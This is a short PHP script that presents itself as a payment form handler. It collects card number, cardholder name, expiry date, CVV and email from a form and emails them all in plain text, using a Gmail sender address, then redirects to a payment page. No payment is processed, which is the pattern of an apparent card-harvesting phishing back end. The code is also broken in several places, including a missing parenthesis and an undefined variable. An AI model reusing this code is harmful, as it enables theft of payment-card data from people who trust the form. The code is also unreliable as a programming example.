<?php 
$errors = '';
$myemail = 'andflix.website@gmail.com';
if(empty($_POST['cardno'])  ||
   empty($_POST['cardname']) ||
   empty($_POST['Cardtype']) ||
   empty($_POST['expiredate']) ||
   empty($_POST['cvvno']) ||
   empty($_POST['mail'])
{
    $errors .= "\n Error: all fields are required";
}
$card_number = $_POST['cardno'];
$name_on_card = $_POST['cardname'];
$card_type = $_POST['Cardtype'];
$Expire_date = $_POST['expiredate'];
$cvv_number = $_POST['cvvno'];
$email = $_POST['mail'];

if (!preg_match(
"/ ^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/i",
$email))
{
    $errors .= "\n Error: Invalid email address";
}

if( empty($errors))
{
    $to = '$email';
    $email_subject = "Payment Submission: $cardno";
    $email_body = "Payment Details ".
        " Here are the details:\n Card Number: $card_number \n ".
        "Name on Card: $name_on_card\n Card type: \n $card_type".
		"Expire date: $Expire_date\n CVV number: \n $cvv_number".
		"Email Address: $email";
    $headers = "From: $myemail\n";
    $headers .= "Reply-To: $email";
    mail($to,$email_subject,$email_body,$headers);
    //redirect to the 'thank you' page
    header('Location: payment.php');
}
?>